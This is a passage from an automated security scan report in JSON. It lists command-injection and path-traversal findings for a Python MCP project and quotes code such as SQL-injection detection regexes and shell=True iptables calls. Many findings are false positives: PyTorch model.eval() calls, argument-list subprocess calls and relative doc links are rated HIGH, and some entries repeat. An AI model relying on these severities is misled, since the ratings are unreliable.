            "context": "\n    The file is expected to contain a Formatter class named ``formattername``\n    (by default, CustomFormatter). Users should be very careful with the input, because\n    this method is equivalent to running ``eval()`` on the input file. The formatter is\n    given the `options` at its instantiation.\n\n    :exc:`pygments.util.ClassNotFound` is raised if there are any errors loading",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `formattername` from that namespace\n        if formattername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/__init__.py",
            "line": 153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `lexername` from that namespace\n        if lexername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "src/utils/git.py",
            "line": 152,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "proc = await asyncio.create_subprocess_exec(",
            "context": "        cmd = ['git'] + args\n        \n        try:\n            proc = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=self.repo_path,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/devops_servers.py",
            "line": 922,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "            ]\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/devops_servers.py",
            "line": 923,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 425,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.run with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing validated command: {base_command} in {work_dir}\")\n        \n        try:\n            # Use subprocess.run with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *parts,  # Unpack the safely parsed command parts\n                cwd=work_dir,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 426,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.run with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *parts,  # Unpack the safely parsed command parts\n                cwd=work_dir,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 830,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \"\"\"Check if Docker is available.\"\"\"\n        if self.docker_available is None:\n            try:\n                process = await asyncio.create_subprocess_exec(\n                    \"docker\", \"--version\",\n                    stdout=asyncio.subprocess.PIPE,\n                    stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1162,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing Docker run with validated arguments: {' '.join(cmd_parts[:5])}...\")\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1163,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1275,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing Docker build with validated arguments: {' '.join(cmd_parts)}\")\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1276,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1335,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1372,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            cmd_parts.append(\"-a\")\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1447,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \"\"\"Check if kubectl is available.\"\"\"\n        if self.kubectl_available is None:\n            try:\n                process = await asyncio.create_subprocess_exec(\n                    \"kubectl\", \"version\", \"--client\",\n                    stdout=asyncio.subprocess.PIPE,\n                    stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1694,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing kubectl apply with validated arguments: {' '.join(cmd_parts)}\")\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1695,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1742,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1783,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1821,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure_servers.py",
            "line": 1854,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd = \" \".join(cmd_parts)\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/mcp_security_core.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "re.compile(r\"(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC(UTE)?|UNION|SCRIPT)\\b)\", re.IGNORECASE),",
            "context": "        \n        # Compile regex patterns for common attacks\n        self.sql_injection_patterns = [\n            re.compile(r\"(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC(UTE)?|UNION|SCRIPT)\\b)\", re.IGNORECASE),\n            re.compile(r\"('|(\\\\\\\\');|--|\\*|\\*/|/\\*)\", re.IGNORECASE),\n            re.compile(r\"(\\b(OR|AND)\\s+\\d+\\s*=\\s*\\d+)\", re.IGNORECASE)\n        ]",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 179,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            cmd = [\"pip-audit\", \"--format\", \"json\", \"--requirement\", requirements_file]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 216,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            cmd = [\"safety\", \"check\", \"--json\", \"--file\", requirements_file]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 263,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            package_dir = Path(package_json_path).parent\n            cmd = [\"npm\", \"audit\", \"--json\"]\n            \n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(package_dir),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 370,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"title\": \"Use of eval()\",",
            "context": "                \"id\": \"eval_usage\",\n                \"pattern\": r\"\\beval\\s*\\(\",\n                \"severity\": VulnerabilitySeverity.HIGH,\n                \"title\": \"Use of eval()\",\n                \"description\": \"Use of eval() function can lead to code injection\"\n            },\n            {",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 371,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"description\": \"Use of eval() function can lead to code injection\"",
            "context": "                \"pattern\": r\"\\beval\\s*\\(\",\n                \"severity\": VulnerabilitySeverity.HIGH,\n                \"title\": \"Use of eval()\",\n                \"description\": \"Use of eval() function can lead to code injection\"\n            },\n            {\n                \"id\": \"hardcoded_secret\",",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 607,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            cmd = [\"trivy\", \"image\", \"--format\", \"json\", image_name]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/security/vulnerability_management.py",
            "line": 646,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            cmd = [\"grype\", \"-o\", \"json\", image_name]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/deployment/health_validator.py",
            "line": 252,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Execute command\n            process = await asyncio.create_subprocess_exec(\n                *command,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 231,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        cmd.append(str(path))\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 371,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        ]\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 435,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # 1. Trufflehog\n        try:\n            cmd = [\"trufflehog\", \"filesystem\", str(path), \"--json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 460,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        try:\n            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as report_file:\n                cmd = [\"gitleaks\", \"detect\", \"--source\", str(path), \"--report-format\", \"json\", \"--report-path\", report_file.name]\n                process = await asyncio.create_subprocess_exec(\n                    *cmd,\n                    stdout=asyncio.subprocess.PIPE,\n                    stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 589,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # Run npm audit\n        try:\n            cmd = [\"npm\", \"audit\", \"--json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 615,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        if check_licenses:\n            try:\n                cmd = [\"license-checker\", \"--json\", \"--production\"]\n                process = await asyncio.create_subprocess_exec(\n                    *cmd,\n                    cwd=str(path),\n                    stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 642,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # Run safety check\n        try:\n            cmd = [\"safety\", \"check\", \"--json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/sast_server.py",
            "line": 667,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        # Check with pip-audit\n        try:\n            cmd = [\"pip-audit\", \"--format\", \"json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/supply_chain_server.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            if not include_dev:\n                cmd.append(\"--production\")\n            \n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/supply_chain_server.py",
            "line": 644,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            cmd = [\"pip\", \"list\", \"--format=json\"]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                cwd=str(path),\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/security/supply_chain_server.py",
            "line": 692,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \"\"\"Get license for Python package.\"\"\"\n        try:\n            cmd = [\"pip\", \"show\", package_name]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "src/mcp/infrastructure/commander_server.py",
            "line": 452,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            command_parts = shlex.split(command)\n            \n            # Create subprocess with resource limits - NO SHELL=True for security\n            process = await asyncio.create_subprocess_exec(\n                *command_parts,\n                cwd=work_dir,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "test_environments/monitoring/test_monitoring_system.py",
            "line": 260,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_chart_data_retrieval(self, dashboard):",
            "context": "        assert len(cpu_chart.data_points) > 0\n        assert cpu_chart.data_points[-1]['y'] == 75.5\n    \n    def test_chart_data_retrieval(self, dashboard):\n        \"\"\"Test chart data retrieval\"\"\"\n        data_manager = dashboard.data_manager\n        ",
            "cvss_score": 7.5
          },
          {
            "file": "test_environments/automation/pipelines/chaos_test_pipeline.py",
            "line": 429,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = subprocess.run(cmd, shell=True, capture_output=True, text=True)",
            "context": "                cmd = f\"iptables -A OUTPUT -d {host} -j DROP\"\n                \n                try:\n                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n                    if result.returncode == 0:\n                        self.network_rules.append(cmd)\n                        timeline.append({",
            "cvss_score": 7.5
          },
          {
            "file": "test_environments/automation/pipelines/chaos_test_pipeline.py",
            "line": 454,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = subprocess.run(delete_rule, shell=True, capture_output=True, text=True)",
            "context": "                delete_rule = rule.replace('-A', '-D')\n                \n                try:\n                    result = subprocess.run(delete_rule, shell=True, capture_output=True, text=True)\n                    timeline.append({\n                        'timestamp': datetime.now().isoformat(),\n                        'event': 'network_partition_removed',",
            "cvss_score": 7.5
          },
          {
            "file": "test_environments/load_generators/coordination/coordination_engine.py",
            "line": 439,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval(rule.condition, {\"__builtins__\": {}}, context)",
            "context": "            }\n            \n            # Evaluate condition\n            return eval(rule.condition, {\"__builtins__\": {}}, context)\n            \n        except Exception as e:\n            logger.error(f\"Error evaluating condition for rule {rule.rule_id}: {e}\")",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/learning_core/prediction_engine.py",
            "line": 544,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.model.eval()",
            "context": "        x = torch.FloatTensor(features)\n        \n        # Make prediction\n        self.model.eval()\n        with torch.no_grad():\n            output = self.model(x)\n            ",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/learning_core/prediction_engine.py",
            "line": 691,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.lstm_model.eval()",
            "context": "        x = torch.FloatTensor(features)\n        \n        # Get predictions from both models\n        self.lstm_model.eval()\n        self.transformer_model.eval()\n        \n        with torch.no_grad():",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/learning_core/prediction_engine.py",
            "line": 692,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.transformer_model.eval()",
            "context": "        \n        # Get predictions from both models\n        self.lstm_model.eval()\n        self.transformer_model.eval()\n        \n        with torch.no_grad():\n            lstm_output = self.lstm_model(x)",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/learning_core/prediction_engine.py",
            "line": 756,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.gnn_model.eval()",
            "context": "        x = torch.FloatTensor(features)\n        \n        # Make prediction\n        self.gnn_model.eval()\n        with torch.no_grad():\n            output = self.gnn_model(x)\n        ",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/learning_core/prediction_engine.py",
            "line": 931,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.meta_model.eval()",
            "context": "        # Use meta-model\n        x = torch.FloatTensor(features).unsqueeze(0)\n        \n        self.meta_model.eval()\n        with torch.no_grad():\n            output = self.meta_model(x)\n        ",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/optimization/engine.py",
            "line": 296,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cpu_cores = int(subprocess.check_output(\"nproc\", shell=True, text=True).strip())",
            "context": "        \"\"\"Detect system capabilities\"\"\"\n        try:\n            # CPU cores\n            cpu_cores = int(subprocess.check_output(\"nproc\", shell=True, text=True).strip())\n            \n            # Memory (approximate)\n            try:",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/optimization/engine.py",
            "line": 300,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "memory_info = subprocess.check_output(\"free -g | grep Mem:\", shell=True, text=True)",
            "context": "            \n            # Memory (approximate)\n            try:\n                memory_info = subprocess.check_output(\"free -g | grep Mem:\", shell=True, text=True)\n                memory_gb = float(memory_info.split()[1])\n            except:\n                memory_gb = 4.0  # Default assumption",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/algorithms.py",
            "line": 200,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.model.eval()",
            "context": "            data = self.pca.transform(data)\n        \n        # Predict\n        self.model.eval()\n        with torch.no_grad():\n            x = torch.FloatTensor(data)\n            predictions = self.model(x).numpy()",
            "cvss_score": 7.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/learning.py",
            "line": 137,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.model.eval()",
            "context": "            padded[0, i, :len(seq)] = seq\n            \n        # Predict\n        self.model.eval()\n        with torch.no_grad():\n            input_tensor = torch.from_numpy(padded)\n            output, _ = self.model(input_tensor)",
            "cvss_score": 7.5
          }
        ]
      },
      "path_traversal_scan": {
        "status": "completed",
        "vulnerabilities_found": 1445,
        "path_traversal_issues": 1445,
        "findings": [
          {
            "file": "fix_critical_documentation_links.py",
            "line": 29,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',",
            "context": "        self.link_mappings = {\n            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 29,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',",
            "context": "        self.link_mappings = {\n            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 29,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',",
            "context": "        self.link_mappings = {\n            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 29,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',",
            "context": "        self.link_mappings = {\n            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',",
            "context": "            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',",
            "context": "            # AI Docs relocations\n            '../docs/architecture.md': '../ai_docs/architecture/ARCHITECTURE.md',\n            '../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',\n            '../deploy/README.md': '../docs/MCP_DEPLOYMENT_ORCHESTRATION_GUIDE.md',\n            ",
            "cvss_score": 8.5
          },
          {
            "file": "fix_critical_documentation_links.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../docs/performance.md': '../ai_docs/performance/PERFORMANCE_OPTIMIZATION_REPORT.md',",
